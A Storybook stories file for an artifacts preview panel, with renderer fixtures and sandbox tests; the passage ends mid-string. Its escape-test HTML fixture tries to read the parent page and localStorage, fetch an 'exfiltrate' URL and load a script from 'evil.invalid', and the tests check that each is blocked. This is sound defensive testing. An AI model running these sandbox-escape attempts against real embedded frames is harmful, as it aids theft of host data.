import type { Meta, StoryObj } from "@storybook/react-vite";
import { expect, userEvent, waitFor, within } from "@storybook/test";
import { useEffect, useRef, type ReactNode } from "react";
import { APIProvider } from "@/browser/contexts/API";
import { updatePersistedState } from "@/browser/hooks/usePersistedState";
import { createMockORPCClient } from "@/browser/stories/mocks/orpc";
import { PIXEL_DISABLED } from "@/browser/stories/meta";
import { ARTIFACTS_ALLOW_CDN_SCRIPTS_KEY } from "@/common/constants/storage";
import type {
  ArtifactEntry,
  ArtifactListing,
  ArtifactReadResult,
} from "@/common/orpc/schemas/artifacts";
import { getArtifactKind } from "@/common/utils/artifactKind";
import { ArtifactsPanel } from "./ArtifactsPanel";
import { writeArtifactSelection } from "./artifactSelection";
import { DESKTOP_ONLY_PREVIEW_NOTICE } from "./executableFrames";
import { ArtifactViewer } from "./ArtifactViewer";
import { openMcpAppView } from "./mcpAppViewsStore";

/**
 * The frame bridge exists only in the desktop app, detected by its preload bridge
 * (executableFrames.ts). Storybook has none, so stories stub it, and restore the original on
 * unmount; `parameters.browserMode` stories remove it to show the bridge-less preview.
 */
function WindowApiStub(props: { browserMode: boolean; children: ReactNode }) {
  const originalApiRef = useRef(window.api);
  if (props.browserMode) {
    delete window.api;
  } else {
    window.api = {
      platform: "linux",
      versions: {},
      getIsRosetta: () => Promise.resolve(false),
    };
  }
  useEffect(() => {
    const savedApi = originalApiRef.current;
    return () => {
      window.api = savedApi;
    };
  }, []);
  return <>{props.children}</>;
}

const meta: Meta<typeof ArtifactsPanel> = {
  title: "Features/RightSidebar/ArtifactsPanel",
  component: ArtifactsPanel,
  decorators: [
    (Story, context) => (
      <WindowApiStub browserMode={context.parameters.browserMode === true}>
        <Story />
      </WindowApiStub>
    ),
  ],
  parameters: {
    layout: "fullscreen",
    viewport: {
      options: {
        // Mirror Pixel's named `phone` and `laptop` viewports so the stories' globals pin the
        // same widths locally that CI snapshots.
        phone390: {
          name: "Phone 390",
          styles: { width: "390px", height: "844px" },
          type: "mobile",
        },
        laptop1200: {
          name: "Laptop 1200",
          styles: { width: "1200px", height: "900px" },
          type: "desktop",
        },
      },
    },
  },
};

export default meta;
type Story = StoryObj<typeof meta>;

const WORKSPACE_ID = "ws-story-artifacts";

// 480x300 bar chart PNG, generated for these stories.
const CHART_PNG_BASE64 =
  "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";

const MARKDOWN = [
  "# Weekly report",
  "",
  "Throughput rose **18%** after the queue change. The chart below is a relative image link,",
  "read from the artifact's folder.",
  "",
  "![Throughput by service](img/chart.png)",
  "",
  "| Service | p95 (ms) |",
  "| ------- | -------- |",
  "| api     | 142      |",
  "| worker  | 388      |",
  "",
  "- Queue depth is stable",
  "- Retries dropped to `0.4%`",
].join("\n");

const JSON_TABLE = JSON.stringify(
  {
    $xum: "table",
    columns: ["service", "requests", "p95_ms", "healthy"],
    rows: [
      { service: "api", requests: 182340, p95_ms: 142, healthy: true },
      { service: "worker", requests: 40211, p95_ms: 388, healthy: true },
      { service: "billing", requests: 9120, p95_ms: 912, healthy: false },
      { service: "search", requests: 66012, p95_ms: 205, healthy: true },
    ],
  },
  null,
  2
);

const CSV = [
  "region,quarter,revenue,note",
  'us-east,Q1,1204000,"Includes ""launch"" promo"',
  "us-west,Q1,980500,",
  'eu-central,Q1,1100230,"Multi-line',
  'note"',
  "ap-south,Q1,402100,Ragged row,extra",
].join("\r\n");

const HTML = `<!doctype html>
<html>
<head>
<style>
  body { font-family: system-ui, sans-serif; margin: 0; padding: 16px; background: #0f172a; color: #e2e8f0; }
  h1 { font-size: 18px; margin: 0 0 12px; }
  .bars { display: flex; gap: 8px; align-items: flex-end; height: 140px; }
  .bar { flex: 1; background: linear-gradient(#38bdf8, #6366f1); border-radius: 4px 4px 0 0; }
  p { font-size: 13px; color: #94a3b8; }
</style>
</head>
<body>
  <h1>Sandboxed HTML artifact</h1>
  <div class="bars">
    <div class="bar" style="height:40%"></div><div class="bar" style="height:75%"></div>
    <div class="bar" style="height:55%"></div><div class="bar" style="height:90%"></div>
  </div>
  <p id="theme"></p>
  <script>
    document.getElementById("theme").textContent = "Host theme: " + window.xum.theme;
  </script>
</body>
</html>`;

const DIFF = `diff --git a/src/queue.ts b/src/queue.ts
index 3b18e51..a9c2f04 100644
--- a/src/queue.ts
+++ b/src/queue.ts
@@ -10,6 +10,9 @@ export class Queue {
   private items: Job[] = [];
 
-  push(job: Job) {
-    this.items.push(job);
+  push(job: Job): void {
+    if (this.items.length >= this.limit) {
+      throw new Error("queue full");
+    }
+    this.items.push(job);
   }
 }
`;

function ok(
  path: string,
  content: string,
  encoding: "utf8" | "base64" = "utf8"
): ArtifactReadResult {
  return {
    status: "ok",
    path,
    kind: getArtifactKind(path),
    size: content.length,
    modifiedMs: 1,
    encoding,
    content,
  };
}

const FILES: Record<string, ArtifactReadResult> = {
  "report.md": ok("report.md", MARKDOWN),
  "img/chart.png": ok("img/chart.png", CHART_PNG_BASE64, "base64"),
  "services.json": ok("services.json", JSON_TABLE),
  "revenue.csv": ok("revenue.csv", CSV),
  "dashboard.html": ok("dashboard.html", HTML),
  "queue.diff": ok("queue.diff", DIFF),
};

function listingFor(files: Record<string, ArtifactReadResult>): ArtifactListing {
  const entries: ArtifactEntry[] = Object.values(files).map((file, index) => ({
    path: file.path,
    kind: file.kind,
    size: file.size,
    modifiedMs: 100 - index,
  }));
  return { available: true, dir: "/scratch/artifacts", entries, truncated: false };
}

function renderPanel(
  selectedPath: string,
  files: Record<string, ArtifactReadResult> = FILES,
  options: { allowCdn?: boolean } = {}
) {
  writeArtifactSelection(WORKSPACE_ID, { scope: "artifact", path: selectedPath, version: null });
  updatePersistedState(ARTIFACTS_ALLOW_CDN_SCRIPTS_KEY, options.allowCdn ?? true);
  return (
    <APIProvider
      client={createMockORPCClient({ artifacts: { listing: listingFor(files), files } })}
    >
      {/* Sidebar-like column: fills a phone screen, right-docked at laptop width. */}
      <div className="bg-background flex h-screen justify-end">
        <div className="bg-sidebar border-border-light h-full w-full max-w-[440px] border-l">
          <ArtifactsPanel workspaceId={WORKSPACE_ID} />
        </div>
      </div>
    </APIProvider>
  );
}

// Per-renderer stories are for local review and play tests. Pixel captures the two gallery
// stories below instead (4 snapshots, not 24): the Pixel budget has no headroom.
const PHONE = {
  globals: { viewport: { value: "phone390", isRotated: false } },
  parameters: { pixel: PIXEL_DISABLED },
} as const;
const LAPTOP = {
  globals: { viewport: { value: "laptop1200", isRotated: false } },
  parameters: { pixel: PIXEL_DISABLED },
} as const;

const waitForMarkdown = async (canvasElement: HTMLElement) => {
  const canvas = within(canvasElement);
  await canvas.findByRole("heading", { name: "Weekly report" });
  const image = await canvas.findByRole("img", { name: "Throughput by service" });
  await waitFor(() => expect(image.getAttribute("src")).toMatch(/^data:image\/png;base64,/));
};
const waitForJsonTable = async (canvasElement: HTMLElement) => {
  const canvas = within(canvasElement);
  await canvas.findByRole("columnheader", { name: "p95_ms" });
  await canvas.findByRole("cell", { name: "billing" });
};
const waitForCsv = async (canvasElement: HTMLElement) => {
  await within(canvasElement).findByRole("cell", { name: 'Includes "launch" promo' });
};
const waitForHtml = async (canvasElement: HTMLElement) => {
  const frame = await within(canvasElement).findByTestId("artifact-frame");
  await expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
};
const zoomImage = async (canvasElement: HTMLElement) => {
  const canvas = within(canvasElement);
  const image = await canvas.findByRole("img", { name: "img/chart.png" });
  await waitFor(() => expect((image as HTMLImageElement).naturalWidth).toBe(480));
  await userEvent.click(canvas.getByRole("button", { name: "Actual size (100%)" }));
  await userEvent.click(canvas.getByRole("button", { name: "Zoom in" }));
  await canvas.findByText(/125%/);
};
const waitForDiff = async (canvasElement: HTMLElement) => {
  await within(canvasElement).findByText("src/queue.ts");
};

const RENDERERS = [
  { path: "report.md", ready: waitForMarkdown },
  { path: "services.json", ready: waitForJsonTable },
  { path: "revenue.csv", ready: waitForCsv },
  { path: "dashboard.html", ready: waitForHtml },
  { path: "img/chart.png", ready: zoomImage },
  { path: "queue.diff", ready: waitForDiff },
] as const;

export const MarkdownPhone: Story = {
  ...PHONE,
  render: () => renderPanel("report.md"),
  play: ({ canvasElement }) => waitForMarkdown(canvasElement),
};
export const MarkdownLaptop: Story = {
  ...LAPTOP,
  render: () => renderPanel("report.md"),
  play: ({ canvasElement }) => waitForMarkdown(canvasElement),
};
export const JsonTablePhone: Story = {
  ...PHONE,
  render: () => renderPanel("services.json"),
  play: ({ canvasElement }) => waitForJsonTable(canvasElement),
};
export const JsonTableLaptop: Story = {
  ...LAPTOP,
  render: () => renderPanel("services.json"),
  play: ({ canvasElement }) => waitForJsonTable(canvasElement),
};
export const CsvPhone: Story = {
  ...PHONE,
  render: () => renderPanel("revenue.csv"),
  play: ({ canvasElement }) => waitForCsv(canvasElement),
};
export const CsvLaptop: Story = {
  ...LAPTOP,
  render: () => renderPanel("revenue.csv"),
  play: ({ canvasElement }) => waitForCsv(canvasElement),
};
export const HtmlSandboxPhone: Story = {
  ...PHONE,
  render: () => renderPanel("dashboard.html"),
  play: ({ canvasElement }) => waitForHtml(canvasElement),
};
/**
 * Outside the desktop app (phones) the artifact still previews, but without the host bridge
 * (executableFrames.ts): no frame Annotate button.
 */
export const HtmlBrowserMode: Story = {
  parameters: { pixel: PIXEL_DISABLED, browserMode: true },
  render: () => renderPanel("dashboard.html"),
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement);
    await waitForHtml(canvasElement);
    await expect(canvas.queryByText(DESKTOP_ONLY_PREVIEW_NOTICE)).toBeNull();
    await expect(canvas.queryByRole("button", { name: "Annotate" })).toBeNull();
  },
};
export const HtmlSandboxLaptop: Story = {
  ...LAPTOP,
  render: () => renderPanel("dashboard.html"),
  play: ({ canvasElement }) => waitForHtml(canvasElement),
};
export const ImageZoomPhone: Story = {
  ...PHONE,
  render: () => renderPanel("img/chart.png"),
  play: ({ canvasElement }) => zoomImage(canvasElement),
};
export const ImageZoomLaptop: Story = {
  ...LAPTOP,
  render: () => renderPanel("img/chart.png"),
  play: ({ canvasElement }) => zoomImage(canvasElement),
};
export const DiffPhone: Story = {
  ...PHONE,
  render: () => renderPanel("queue.diff"),
  play: ({ canvasElement }) => waitForDiff(canvasElement),
};
export const DiffLaptop: Story = {
  ...LAPTOP,
  render: () => renderPanel("queue.diff"),
  play: ({ canvasElement }) => waitForDiff(canvasElement),
};

/** Every renderer at once, one panel per cell: stacked on phones, a 3-column grid on laptops. */
function renderGallery() {
  updatePersistedState(ARTIFACTS_ALLOW_CDN_SCRIPTS_KEY, true);
  for (const renderer of RENDERERS) {
    writeArtifactSelection(`${WORKSPACE_ID}-${renderer.path}`, {
      scope: "artifact",
      path: renderer.path,
      version: null,
    });
  }
  return (
    <APIProvider
      client={createMockORPCClient({ artifacts: { listing: listingFor(FILES), files: FILES } })}
    >
      <div className="bg-background grid grid-cols-1 gap-2 p-2 min-[1000px]:grid-cols-3">
        {RENDERERS.map((renderer) => (
          <div
            key={renderer.path}
            data-gallery-cell={renderer.path}
            className="bg-sidebar border-border-light h-[420px] min-w-0 border"
          >
            <ArtifactsPanel workspaceId={`${WORKSPACE_ID}-${renderer.path}`} />
          </div>
        ))}
      </div>
    </APIProvider>
  );
}

async function waitForGallery(canvasElement: HTMLElement) {
  for (const renderer of RENDERERS) {
    const cell = canvasElement.querySelector<HTMLElement>(`[data-gallery-cell="${renderer.path}"]`);
    await expect(cell).not.toBeNull();
    await renderer.ready(cell!);
  }
}

export const GalleryPhone: Story = {
  globals: { viewport: { value: "phone390", isRotated: false } },
  parameters: { pixel: { matrix: { themes: ["dark", "light"], viewports: ["phone"] } } },
  render: renderGallery,
  play: ({ canvasElement }) => waitForGallery(canvasElement),
};

export const GalleryLaptop: Story = {
  globals: { viewport: { value: "laptop1200", isRotated: false } },
  parameters: { pixel: { matrix: { themes: ["dark", "light"], viewports: ["laptop"] } } },
  render: renderGallery,
  play: ({ canvasElement }) => waitForGallery(canvasElement),
};

const CANVAS = JSON.stringify(
  {
    $xum: "canvas",
    blocks: [
      {
        type: "markdown",
        text: "# Q3 service review\n\nLatency held steady while traffic grew. Numbers below come from `data/throughput.json`.",
      },
      { type: "stat", label: "Requests", value: "297k", delta: "+18% vs Q2" },
      { type: "stat", label: "p95 latency", value: "142 ms", delta: "-6 ms" },
      { type: "stat", label: "Error rate", value: "0.4%" },
      {
        type: "chart",
        kind: "bar",
        title: "Requests by service (inline data)",
        data: [
          { service: "api", requests: 182340 },
          { service: "worker", requests: 40211 },
          { service: "search", requests: 66012 },
          { service: "billing", requests: 9120 },
        ],
        x: "service",
        y: "requests",
      },
      {
        type: "chart",
        kind: "line",
        title: "Weekly throughput (data/throughput.json)",
        data: "data/throughput.json#/series",
        x: "week",
        y: ["api", "worker"],
      },
      {
        type: "table",
        columns: ["service", "owner", "status"],
        rows: [
          { service: "api", owner: "platform", status: "healthy" },
          { service: "billing", owner: "payments", status: "degraded after the 2026-09-14 deploy" },
          ["search", "discovery", "healthy"],
        ],
      },
      { type: "diff", patch: DIFF },
      { type: "image", src: "img/chart.png", alt: "Throughput chart" },
      {
        type: "button",
        label: "Draft the Q4 plan",
        send: "Draft a Q4 plan from this review.",
        data: { quarter: "Q3" },
      },
      { type: "widget", note: "a type this renderer does not know" },
    ],
  },
  null,
  2
);

const CANVAS_FILES: Record<string, ArtifactReadResult> = {
  "q3.canvas.json": ok("q3.canvas.json", CANVAS),
  "data/throughput.json": ok(
    "data/throughput.json",
    JSON.stringify({
      series: [
        { week: "W1", api: 12.1, worker: 3.2 },
        { week: "W2", api: 13.4, worker: 3.1 },
        { week: "W3", api: 12.8, worker: 3.9 },
        { week: "W4", api: 15.2, worker: 4.4 },
        { week: "W5", api: 16.0, worker: 4.1 },
      ],
    })
  ),
  "img/chart.png": FILES["img/chart.png"],
};

/**
 * Every canvas block type, rendered by the viewer directly so the button has interactions
 * (the panel wires those itself). One story, phone + laptop: the column is the sidebar width.
 */
export const CanvasGallery: Story = {
  parameters: {
    pixel: { matrix: { themes: ["dark", "light"], viewports: ["phone", "laptop"] } },
  },
  render: () => (
    <APIProvider
      client={createMockORPCClient({
        artifacts: { listing: listingFor(CANVAS_FILES), files: CANVAS_FILES },
      })}
    >
      <div className="bg-background flex justify-end">
        <div className="bg-sidebar border-border-light w-full max-w-[440px] min-w-0 border-l">
          <ArtifactViewer
            result={CANVAS_FILES["q3.canvas.json"]}
            workspaceId={WORKSPACE_ID}
            interactions={{ requestSend: () => undefined }}
          />
        </div>
      </div>
    </APIProvider>
  ),
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement);
    await canvas.findByRole("heading", { name: "Q3 service review" });
    await canvas.findByText("Unsupported block: widget");
    await canvas.findByRole("button", { name: "Draft the Q4 plan" });
    const image = await canvas.findByRole("img", { name: "Throughput chart" });
    await waitFor(() => expect(image.getAttribute("src")).toMatch(/^data:image\/png;base64,/));
    // Both charts drew (the second from the referenced file, via its JSON pointer).
    await waitFor(() => expect(canvasElement.querySelectorAll(".recharts-wrapper").length).toBe(2));
  },
};

const INTERACTIVE_CANVAS = JSON.stringify({
  $xum: "canvas",
  blocks: [
    {
      type: "markdown",
      text: "# Rollout options\n\nPlan B ships the cache behind a flag and keeps the old path for a week.",
    },
    { type: "stat", label: "Risk", value: "Low", delta: "-2 vs plan A" },
    { type: "button", label: "Approve plan B", send: "Approve plan B.", data: { plan: "B" } },
  ],
});

/**
 * Host-owned controls around an artifact (M5b): the confirm strip after the canvas button asked
 * to send (nothing is sent without the user's click), and annotate mode with a text selection's
 * comment box open.
 */
export const SendStripAndAnnotate: Story = {
  parameters: {
    pixel: { matrix: { themes: ["dark", "light"], viewports: ["phone", "laptop"] } },
  },
  render: () =>
    renderPanel("rollout.canvas.json", {
      "rollout.canvas.json": ok("rollout.canvas.json", INTERACTIVE_CANVAS),
    }),
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement);
    await userEvent.click(await canvas.findByRole("button", { name: "Approve plan B" }));
    const strip = await canvas.findByTestId("artifact-send-strip");
    await within(strip).findByText("Approve plan B.");
    // Send arms shortly after the strip appears; wait so the snapshot is stable.
    const send = within(strip).getByRole("button", { name: "Send" });
    await waitFor(() => expect(send).toBeEnabled(), { timeout: 5000 });

    await userEvent.click(canvas.getByRole("button", { name: "Annotate" }));
    await canvas.findByText("Annotating: select text to comment on it.");
    const paragraph = await canvas.findByText(/Plan B ships the cache/);
    const text = paragraph.firstChild!;
    const range = canvasElement.ownerDocument.createRange();
    range.setStart(text, 0);
    range.setEnd(text, "Plan B ships the cache".length);
    const selection = canvasElement.ownerDocument.getSelection()!;
    selection.removeAllRanges();
    selection.addRange(range);
    paragraph.dispatchEvent(new MouseEvent("mouseup", { bubbles: true }));
    const popover = await canvas.findByTestId("artifact-annotation-popover");
    await within(popover).findByText("“Plan B ships the cache”");
  },
};

/** Toolbar version menu, open: "Latest (live)" plus stored versions, newest first. */
function renderVersionMenu() {
  const workspaceId = `${WORKSPACE_ID}-versions`;
  writeArtifactSelection(workspaceId, { scope: "artifact", path: "report.md", version: null });
  const now = Date.now();
  const at = (minutesAgo: number) => now - minutesAgo * 60_000;
  const base = { sha256: "sha", size: MARKDOWN.length, path: "report.md" } as const;
  return (
    <APIProvider
      client={createMockORPCClient({
        artifacts: {
          listing: listingFor(FILES),
          files: FILES,
          versions: {
            "report.md": [
              {
                ...base,
                version: 3,
                label: "Weekly report, final",
                source: "publish",
                createdAtMs: at(4),
              },
              { ...base, version: 2, label: null, source: "turn-end", createdAtMs: at(95) },
              {
                ...base,
                version: 1,
                label: "First draft",
                source: "publish",
                createdAtMs: at(60 * 26),
              },
            ],
          },
        },
      })}
    >
      <div className="bg-background flex h-screen justify-end">
        <div className="bg-sidebar border-border-light h-full w-full max-w-[440px] border-l">
          <ArtifactsPanel workspaceId={workspaceId} />
        </div>
      </div>
    </APIProvider>
  );
}

export const VersionMenuOpen: Story = {
  parameters: { pixel: { matrix: { themes: ["dark", "light"], viewports: ["laptop"] } } },
  render: renderVersionMenu,
  play: async ({ canvasElement }) => {
    await waitForMarkdown(canvasElement);
    const canvas = within(canvasElement);
    await userEvent.click(await canvas.findByRole("button", { name: "Version: Latest (live)" }));
    const menu = await canvas.findByRole("menu", { name: "Artifact versions" });
    await within(menu).findByText("Turn snapshot");
  },
};

/** Picker open on the Shelf group (M5c): project then global entries, with who pinned them. */
function renderShelfPicker() {
  const workspaceId = `${WORKSPACE_ID}-shelf`;
  writeArtifactSelection(workspaceId, { scope: "artifact", path: "report.md", version: null });
  const now = Date.now();
  const entry = (
    scope: "project" | "global",
    file: string,
    title: string,
    pinnedBy: "agent" | "user",
    minutesAgo: number
  ) => ({
    scope,
    name: file,
    file,
    title,
    kind: getArtifactKind(file),
    size: 2048,
    version: 2,
    sourceWorkspaceId: "ws-other",
    sourcePath: file,
    pinnedAtMs: now - minutesAgo * 60_000,
    pinnedBy,
  });
  return (
    <APIProvider
      client={createMockORPCClient({
        artifacts: {
          listing: listingFor(FILES),
          files: FILES,
          shelf: {
            project: {
              available: true,
              entries: [
                entry("project", "migration-plan.md", "migration plan", "agent", 12),
                entry("project", "schema.svg", "schema diagram", "user", 300),
              ],
            },
            global: [entry("global", "style-guide.html", "style guide", "user", 60 * 30)],
          },
        },
      })}
    >
      <div className="bg-background flex h-screen justify-end">
        <div className="bg-sidebar border-border-light h-full w-full max-w-[440px] border-l">
          <ArtifactsPanel workspaceId={workspaceId} />
        </div>
      </div>
    </APIProvider>
  );
}

const openShelfPicker = async (canvasElement: HTMLElement) => {
  await waitForMarkdown(canvasElement);
  await userEvent.click(within(canvasElement).getByRole("combobox", { name: "Artifact" }));
  // Radix portals the list to document.body.
  const listbox = await within(document.body).findByRole("listbox");
  await within(listbox).findByText("Shelf");
  await within(listbox).findByText("project · pinned by agent");
  await within(listbox).findByText("global · pinned by you");
};

export const ShelfPickerPhone: Story = {
  parameters: { pixel: { matrix: { themes: ["dark", "light"], viewports: ["phone"] } } },
  globals: { viewport: { value: "phone390", isRotated: false } },
  render: renderShelfPicker,
  play: ({ canvasElement }) => openShelfPicker(canvasElement),
};

export const ShelfPickerLaptop: Story = {
  parameters: { pixel: { matrix: { themes: ["dark", "light"], viewports: ["laptop"] } } },
  render: renderShelfPicker,
  play: ({ canvasElement }) => openShelfPicker(canvasElement),
};

// ---------------------------------------------------------------------------------------------
// Escape attempts (executed in a real browser by the Storybook test runner).
//
// The artifact tries to reach the app and reports what happened with a plain postMessage that
// this story listens for directly (not through the bridge, which would drop it). CSP
// violations are recorded from inside the frame, so the CDN assertions do not depend on
// network access: with CDN scripts off, the jsDelivr Chart.js tag must raise a script-src
// violation; with them on, it must not (it then loads, or fails only on the network).
// ---------------------------------------------------------------------------------------------

const ESCAPE_HTML = `<!doctype html>
<html><head>
<script>
  var results = { violations: [] };
  document.addEventListener("securitypolicyviolation", function (e) {
    results.violations.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI) });
  });
  function attempt(fn) { try { fn(); return "allowed"; } catch (e) { return "blocked:" + e.name; } }
  results.parentDocument = attempt(function () { return parent.document.body.innerHTML.length; });
  results.localStorage = attempt(function () { return window.localStorage.getItem("x"); });
  results.topNavigation = attempt(function () { top.location.href = "https://example.com/escaped"; });
  var fetched = fetch("https://example.com/exfiltrate").then(
    function () { return "allowed"; },
    function (e) { return "blocked:" + e.name; }
  );
  window.addEventListener("load", function () {
    fetched.then(function (fetchResult) {
      setTimeout(function () {
        results.fetch = fetchResult;
        results.chartLoaded = typeof window.Chart === "function";
        parent.postMessage({ xumEscapeTest: results }, "*");
      }, 300);
    });
  });
</script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
<script src="https://evil.invalid/steal.js"></script>
</head><body><p>escape test</p></body></html>`;

interface EscapeResults {
  violations: Array<{ directive: string; blocked: string }>;
  parentDocument: string;
  localStorage: string;
  topNavigation: string;
  fetch: string;
  chartLoaded: boolean;
}

let escapeResults: EscapeResults | null = null;
const collectEscapeResults = () => {
  escapeResults = null;
  const handler = (event: MessageEvent) => {
    const data = event.data as { xumEscapeTest?: EscapeResults } | null;
    if (data?.xumEscapeTest != null) escapeResults = data.xumEscapeTest;
  };
  window.addEventListener("message", handler);
  return () => window.removeEventListener("message", handler);
};

async function assertEscapeAttemptsFail(allowCdn: boolean) {
  const startUrl = window.location.href;
  await waitFor(() => expect(escapeResults).not.toBeNull(), { timeout: 15000 });
  const results = escapeResults!;
  await expect(results.parentDocument).toMatch(/^blocked/);
  await expect(results.localStorage).toMatch(/^blocked/);
  await expect(results.fetch).toMatch(/^blocked/);
  // Top navigation is refused (Chromium throws; either way the story page must not move).
  await expect(results.topNavigation).not.toBe("allowed");
  await expect(window.location.href).toBe(startUrl);
  const blockedHost = (host: string) => results.violations.some((v) => v.blocked.includes(host));
  await expect(blockedHost("evil.invalid")).toBe(true);
  await expect(blockedHost("example.com")).toBe(true);
  await expect(blockedHost("cdn.jsdelivr.net")).toBe(!allowCdn);
  if (!allowCdn) await expect(results.chartLoaded).toBe(false);
}

export const EscapeAttemptsCdnOn: Story = {
  parameters: { pixel: PIXEL_DISABLED },
  beforeEach: collectEscapeResults,
  render: () => renderPanel("escape.html", { "escape.html": ok("escape.html", ESCAPE_HTML) }),
  play: () => assertEscapeAttemptsFail(true),
};

export const EscapeAttemptsCdnOff: Story = {
  parameters: { pixel: PIXEL_DISABLED },
  beforeEach: collectEscapeResults,
  render: () =>
    renderPanel(
      "escape.html",
      { "escape.html": ok("escape.html", ESCAPE_HTML) },
      { allowCdn: false }
    ),
  play: () => assertEscapeAttemptsFail(false),
};

// Self-navigation: CSP cannot stop a frame from navigating itself, and the new page would keep
// the same contentWindow (and so the bridge). The host must notice the second load, drop the
// frame and offer a reload instead. data: targets keep the stories offline.
const NAVIGATE_AWAY_TARGET = "data:text/html,<p>navigated</p>";
const navigateAwayHtml = (how: "location" | "link") => `<!doctype html><html><head><script>
  window.addEventListener("load", function () {
    ${
      how === "location"
        ? `location.href = ${JSON.stringify(NAVIGATE_AWAY_TARGET)};`
        : 'document.getElementById("away").click();'
    }
  });
</script></head><body><a id="away" href="${NAVIGATE_AWAY_TARGET}">away</a></body></html>`;

const assertNavigatedAway = async (canvasElement: HTMLElement) => {
  const canvas = within(canvasElement);
  await canvas.findByText(/This artifact navigated away/, undefined, { timeout: 10000 });
  await expect(canvas.queryByTestId("artifact-frame")).toBeNull();
  await expect(canvas.getByRole("button", { name: "Reload" })).toBeTruthy();
};

export const NavigateAwayLocation: Story = {
  parameters: { pixel: PIXEL_DISABLED },
  render: () =>
    renderPanel("away.html", { "away.html": ok("away.html", navigateAwayHtml("location")) }),
  play: ({ canvasElement }) => assertNavigatedAway(canvasElement),
};

export const NavigateAwayLink: Story = {
  parameters: { pixel: PIXEL_DISABLED },
  render: () =>
    renderPanel("away.html", { "away.html": ok("away.html", navigateAwayHtml("link")) }),
  play: ({ canvasElement }) => assertNavigatedAway(canvasElement),
};

// The frame forwards Escape over the bridge, so Escape pressed inside a fullscreen HTML
// artifact exits fullscreen. The artifact synthesizes the key press itself and reports it.
const BRIDGE_HTML = `<!doctype html><html><head><script>
